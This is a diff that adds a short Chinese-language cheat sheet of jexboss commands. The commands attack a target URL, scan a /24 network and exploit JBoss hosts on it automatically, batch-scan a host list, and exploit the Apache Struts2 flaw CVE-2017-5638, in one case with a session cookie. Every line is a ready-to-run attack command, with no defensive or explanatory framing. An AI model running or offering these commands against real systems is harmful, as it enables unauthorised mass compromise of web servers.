@@ -1,0 +1,20 @@
+## 攻击目标网站
+python2 jexboss.py -u http://192.168.0.26:8080
+## 网络扫描模式
+python  jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt
+## 自动化漏洞利用的网络扫描模式
+python2 jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt
+
+## 自动化漏洞利用的网络扫描模式（多端口）
+python2 jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080,80,8888 -results results_auto_scan.txt
+
+## 批量扫描
+python2 jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log
+
+## 针对 Apache Struts2（CVE-2017-5638漏洞）
+python2 jexboss.py -u http://xx.xx.xx.xx/xxx.action --struts2
+
+## 带Cookie的CVE-2017-5638漏洞利用
+python2 jexboss.py -u http://xx.xx.xx.xx/xxx.action --struts2 --cookie "JSESSIONID=24517D9075136F202DCE20E9C89D424D"
+
+
